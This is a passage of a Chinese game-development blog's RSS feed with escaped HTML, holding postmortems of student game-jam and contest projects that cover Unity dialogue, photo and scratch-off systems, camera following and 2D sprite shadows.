	srcset=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/%E6%88%98%E6%96%97%E9%A1%B5%E9%9D%A2_hu13589104296129632743.png 480w, https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/%E6%88%98%E6%96%97%E9%A1%B5%E9%9D%A2_hu10292648484601390534.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;战斗页面&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;213&#34;
		data-flex-basis=&#34;512px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/1858293-20220604154347919-1098005980.png&#34;
	width=&#34;1061&#34;
	height=&#34;718&#34;
	srcset=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/1858293-20220604154347919-1098005980_hu6873870499846169469.png 480w, https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/1858293-20220604154347919-1098005980_hu12237455489209668512.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;装备数据库&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;147&#34;
		data-flex-basis=&#34;354px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;使用的素材&#34;&gt;使用的素材：
&lt;/h3&gt;&lt;p&gt;怪物图片：https://pixeljoint.com/pixelart/41620.htm&lt;/p&gt;
&lt;p&gt;道具图片：https://cheekyinkling.itch.io/shikashis-fantasy-icons-pack&lt;/p&gt;
&lt;p&gt;人物图片：https://craftpix.net/freebies/free-halfing-avatar-icons/&lt;/p&gt;
&lt;p&gt;背景图片：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://yangsh.artstation.com/projects/mq5GNd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://yangsh.artstation.com/projects/mq5GNd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.artstation.com/artwork/A95vPo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.artstation.com/artwork/A95vPo&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【开发复盘】2021网易游戏高校MINI-GAME挑战赛作品《戏幕未落》</title>
        <link>https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/</link>
        <pubDate>Mon, 01 Nov 2021 09:03:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/</guid>
        <description>&lt;img src="https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD.jpg" alt="Featured image of post 【开发复盘】2021网易游戏高校MINI-GAME挑战赛作品《戏幕未落》" /&gt;&lt;h1 id=&#34;开发复盘2021网易游戏高校mini-game挑战赛作品戏幕未落&#34;&gt;【开发复盘】2021网易游戏高校MINI-GAME挑战赛作品《戏幕未落》
&lt;/h1&gt;&lt;p&gt;欢迎大家给我们投票！
&lt;a class=&#34;link&#34; href=&#34;https://game.academy.163.com/event/mg?page=works&amp;amp;id=2443&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://game.academy.163.com/event/mg?page=works&amp;id=2443&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;依旧是主程，这次逻辑需求大概分为基本操作、对话系统、拍照系统、演绎系统四个方面。&lt;/p&gt;
&lt;h2 id=&#34;基本操作&#34;&gt;基本操作
&lt;/h2&gt;&lt;p&gt;初期为2d横板探索，之后修改为2d+3d探索，主要交互为对话触发剧情、特色为拍照系统与演绎系统。&lt;/p&gt;
&lt;p&gt;同上一个项目一样，3d场景+2d人物，添加了z轴移动，当然是有范围限制的。&lt;/p&gt;
&lt;p&gt;鉴于上一个项目的经验，这次直接给2d人物添加阴影。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170159434-204429009.png&#34;
	width=&#34;868&#34;
	height=&#34;482&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170159434-204429009_hu10671780208919604677.png 480w, https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170159434-204429009_hu8020816573151655839.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20211031172309529&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;180&#34;
		data-flex-basis=&#34;432px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;对话系统&#34;&gt;对话系统
&lt;/h2&gt;&lt;p&gt;对话用的框架被我大改特改，因为这次没有涉及到大量对话，所以没有用到excel来进行序列化，而是直接将剧情写在代码里当作字符串使用了。&lt;/p&gt;
&lt;p&gt;同时这个对话框架还是问题很大，市面上的商业文字游戏标准是十分的话，我手上的框架就只是二三分的水平。体量太大或者太小都不适用，也不安全。协程控制的一些效果也会有冲突。&lt;/p&gt;
&lt;p&gt;得想办法升级一下啊。&lt;/p&gt;
&lt;h2 id=&#34;拍照系统&#34;&gt;拍照系统
&lt;/h2&gt;&lt;p&gt;其实就是找个camera来渲染画面，只渲染人物动作和场景，不渲染UI和其他乱七八糟的，然后在左下角加个游戏的logo，这样还可以分享照片达到游戏社交的效果。&lt;/p&gt;
&lt;p&gt;代码上就是用rect来控制宽高，然后创建一个Texture2D，将数据写入文件就好。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170200165-2002188820.png&#34;
	width=&#34;1210&#34;
	height=&#34;683&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170200165-2002188820_hu512830879511891533.png 480w, https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170200165-2002188820_hu11563140279085283212.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20211101170119041&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;425px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;演绎系统&#34;&gt;演绎系统
&lt;/h2&gt;&lt;p&gt;因为大赛主题为“戏”，所以这个系统比较重要，大概分为三块。&lt;/p&gt;
&lt;h3 id=&#34;第一块剪裁&#34;&gt;第一块：剪裁
&lt;/h3&gt;&lt;p&gt;大概意思就是在纸上剪个小人出来，会给你轮廓，然后需要玩家沿轮廓画线把小人裁出来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170200857-1062682303.png&#34;
	width=&#34;1006&#34;
	height=&#34;795&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170200857-1062682303_hu10003856720342027242.png 480w, https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170200857-1062682303_hu6726914465103640175.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20211101170129713&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;303px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;程序实现上有两处：画线和范围判定。&lt;/p&gt;
&lt;p&gt;画线借鉴了油管的&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=pa_U64G7gkE&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;该视频&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;范围判定我没什么好的想法，就是在轮廓上取了十几个点，然后每帧计算鼠标坐标距离这些点的位置，最后鼠标松开的时候求个平均值来划范围。显然这也太蠢了，但我确实没什么好办法5555，其实如果多取几个点，取上百个点的话说不定会好一点。&lt;/p&gt;
&lt;p&gt;然后就是用DoTween进行一个动画的放~&lt;/p&gt;
&lt;h3 id=&#34;第二块涂色&#34;&gt;第二块：涂色
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170201242-932769393.png&#34;
	width=&#34;322&#34;
	height=&#34;420&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170201242-932769393_hu14521976504651374045.png 480w, https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/1858293-20211101170201242-932769393_hu4401368838818628466.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20211101170140424&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;76&#34;
		data-flex-basis=&#34;184px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我管这个叫刮刮乐，就是两层，上面一层当作蒙版，鼠标在上面拖动就会擦除像素点，这段代码借鉴了&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/lzzhentou/p/11634696.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;并加了一些修改。总之是可以判断刮了多少范围，然后进行事件的触发。&lt;/p&gt;
&lt;h3 id=&#34;第三块拼图&#34;&gt;第三块：拼图
&lt;/h3&gt;&lt;p&gt;这个就比较简单了，简单的拖拽游戏。（原本策划说要可以随机摆放，我嫌麻烦给改成固定位置了）&lt;/p&gt;
&lt;h2 id=&#34;一些记录&#34;&gt;一些记录
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这次用到了DoTween插件，我觉得可以用在对话框架里代替原本的一些渐入渐出啊移动之类的效果，真的很方便！&lt;/li&gt;
&lt;li&gt;果然游戏是不可以缺少音乐音效的，我一直打比方说如果一款游戏是个人，那么策划就构成了游戏的形体，美术组成血肉与皮肤，程序则负责搭建起骨架和神经。现在我要把音乐也加进去，音乐就是这个人的灵魂！！&lt;/li&gt;
&lt;li&gt;项目管理出了点问题，到最后加班的时候我电脑里素材乱七八糟的很难找到需要的东西。&lt;/li&gt;
&lt;li&gt;最后差点做不完，可能我又要拼场景又要挂脚本吧，但是我觉得还是脚本写的不够优雅。很多触发事件都可以再精简一点，抽象成同一套机制。而且对话机制也需要修改一下。我需要找时间改一套自己的工具箱，可以拿出来就用。&lt;/li&gt;
&lt;li&gt;研究一下DoTween的源码，手上还有一套TBS的简单框架也研究一下，回头写个博客。&lt;/li&gt;
&lt;li&gt;就先这样&lt;del&gt;欢迎投票&lt;/del&gt; &lt;a class=&#34;link&#34; href=&#34;https://game.academy.163.com/event/mg?page=works&amp;amp;id=2443&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://game.academy.163.com/event/mg?page=works&amp;id=2443&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>【GameJam】机核网BOOOM游戏创作挑战开发复盘</title>
        <link>https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/</link>
        <pubDate>Fri, 27 Aug 2021 16:12:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/</guid>
        <description>&lt;h1 id=&#34;gamejam机核网booom游戏创作挑战开发复盘&#34;&gt;【GameJam】机核网BOOOM游戏创作挑战开发复盘
&lt;/h1&gt;&lt;p&gt;要开学了，返校前进行一波复盘。&lt;/p&gt;
&lt;p&gt;我们组的作品《GANDER COMPANY》，介时会有宣传视频，并会在机核网游戏创作市集线上展示。之后会在这里补上链接。
&lt;a class=&#34;link&#34; href=&#34;https://www.gcores.com/games/67514&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.gcores.com/games/67514&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;程序只有我一个人啊，所以复盘也来得很快，把一些想法和思路写在这里，没啥技术力，凑活看，权当记录。&lt;/p&gt;
&lt;h2 id=&#34;游戏本质问题&#34;&gt;游戏本质问题
&lt;/h2&gt;&lt;p&gt;引擎用的unity 2020.3.14f1c1 ，当策划确定下游戏主题之后，就该我考虑实现方式了。&lt;/p&gt;
&lt;p&gt;这次项目首次引进了3D建模，但本身还是和2D的结合，实质就是一个2D游戏，只不过表现上进行了伪3D。&lt;/p&gt;
&lt;p&gt;虽然场景是3D的，而且存在光影。但游戏只有左右控制，也就是只有X轴，甚至没有上下，出现上下都是程序出bug了，所以说本质就是个2D横板游戏。&lt;/p&gt;
&lt;h2 id=&#34;相机视角问题&#34;&gt;相机视角问题
&lt;/h2&gt;&lt;p&gt;由于存在场景3D+人物2D，摄像机直接和人物一个平面就好，调整下y轴和z轴，让摄像机跟人物有个合适的距离，看着舒服。&lt;/p&gt;
&lt;p&gt;然后因为模型师也算是外包性质（策划叫的同学短时合作），我们之前也没有尝试将3D元素添加进来，所以场景模型上可能会有些小问题，比如说房间建模稍小这样子，都不是什么大问题，我在unity里略作调整就好。&lt;/p&gt;
&lt;p&gt;这里就涉及到摄像机的位置了，多个房间，我是直接摆在同一个场景里的，场景跳转切个黑幕直接换人物坐标。要控制摄像机的视角内不会出现其他不该出现的内容。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001050953-1422588183.png&#34;
	width=&#34;1104&#34;
	height=&#34;574&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001050953-1422588183_hu12041031046299009765.png 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001050953-1422588183_hu5587569030691575789.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210827111024187&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;192&#34;
		data-flex-basis=&#34;461px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;用&lt;code&gt;Vector3.Lerp&lt;/code&gt;给摄像机加个跟踪人物，然后写了个数组用&lt;code&gt;Mathf.Clamp&lt;/code&gt;控制摄像机的范围，方法有些简陋，但是能实现需求。&lt;/p&gt;
&lt;h2 id=&#34;2d在3d上的投影&#34;&gt;2D在3D上的投影
&lt;/h2&gt;&lt;p&gt;这个问题纠结了我半天，3D物体自带投影，但是2D就是个图片，我一时不知道怎么投影。&lt;/p&gt;
&lt;p&gt;然后&lt;a class=&#34;link&#34; href=&#34;https://hananon.com/how-to-make-2d-sprite-cast-and-receive-shadow-in-3d-world-using-unity-shader-graph/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;跟着这个&lt;/a&gt;做了半天，发现涉及到渲染了，顿时感觉不妙。&lt;/p&gt;
&lt;p&gt;琢磨了好几天，甚至都要开始搞shader了，然后发现了个简单的解决方式。&lt;/p&gt;
&lt;p&gt;首先简单的搭一个场景：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001051973-1645081158.png&#34;
	width=&#34;1104&#34;
	height=&#34;574&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001051973-1645081158_hu12373567489199066051.png 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001051973-1645081158_hu3307778599316884555.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210827113335300&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;192&#34;
		data-flex-basis=&#34;461px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;想要让2D投影,需要对Sprite Renderer进行设置：&lt;/p&gt;
&lt;p&gt;点右上角的三个点，然后选debug：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052238-1130435379.png&#34;
	width=&#34;457&#34;
	height=&#34;177&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052238-1130435379_hu16506848972163367807.png 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052238-1130435379_hu17594390059212077970.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210827145836499&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;258&#34;
		data-flex-basis=&#34;619px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;将sprite renderer的投影和接受阴影都打开：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052427-1542114718.png&#34;
	width=&#34;453&#34;
	height=&#34;274&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052427-1542114718_hu7612897020065781925.png 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052427-1542114718_hu4331382085641687400.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210827150058274&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;165&#34;
		data-flex-basis=&#34;396px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;接下来给sprite换个材质，2d人物不会有阴影的，但是我偶然发现了这个材质可以让人物拥有：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052676-1299136170.png&#34;
	width=&#34;717&#34;
	height=&#34;360&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052676-1299136170_hu10788055256016758197.png 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052676-1299136170_hu16831406855468723351.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210827150534556&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;199&#34;
		data-flex-basis=&#34;478px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;记得打开灯光的阴影选项，不然不会产生阴影：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052920-2097065813.png&#34;
	width=&#34;440&#34;
	height=&#34;446&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052920-2097065813_hu2180216396390891497.png 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001052920-2097065813_hu10357146046505134680.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210827150508988&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;98&#34;
		data-flex-basis=&#34;236px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;由于我不太懂渲染这块，这个粒子系统为什么会有，使用它会产生什么样的影响，我都不太明白，但是他能用。这个材质其实有个缺点，就是他只能单面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001053867-637226462.gif&#34;
	width=&#34;976&#34;
	height=&#34;454&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001053867-637226462_hu15397343357605480646.gif 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001053867-637226462_hu7832804157510415276.gif 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;演示1&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;214&#34;
		data-flex-basis=&#34;515px&#34;
	
&gt;&lt;/p&gt;
